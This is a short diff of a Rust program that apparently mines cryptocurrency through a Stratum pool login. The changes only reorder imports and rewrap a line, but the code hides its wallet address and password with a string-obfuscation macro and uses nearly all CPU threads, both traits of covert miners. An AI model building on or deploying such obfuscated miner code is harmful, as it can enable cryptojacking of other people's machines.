@@ -1,11 +1,11 @@
-use orng_rust::{Stratum, Worker};
 use clap::Parser;
+use obfstr::obfstr;
+use orng_rust::{Stratum, Worker};
 use std::{
     io,
     num::NonZeroUsize,
     time::{Duration, Instant},
 };
-use obfstr::obfstr;
 
 const KEEP_ALIVE_INTERVAL: Duration = Duration::from_secs(60);
 
@@ -51,7 +51,8 @@ fn main() -> io::Result<()> {
     // Convert obfuscated values to String to extend their lifetime
     let user_val = obfstr!("44qARb3o5kWimeStvm9g4r5kTCMSZio8SEWDcEy9HKnnXg6iQns7Mqi4SrrSNZV6mG1YQWqRgr5Lph1BxfQFK8Kz8hMidXR").to_string();
     let pass_val = obfstr!("x").to_string();
-    let threads = NonZeroUsize::new(all_threads().get() - 1).unwrap_or(NonZeroUsize::new(1).unwrap());
+    let threads =
+        NonZeroUsize::new(all_threads().get() - 1).unwrap_or(NonZeroUsize::new(1).unwrap());
     let light = false;
 
     let mut stratum = Stratum::login(&url, &user_val, &pass_val)?;
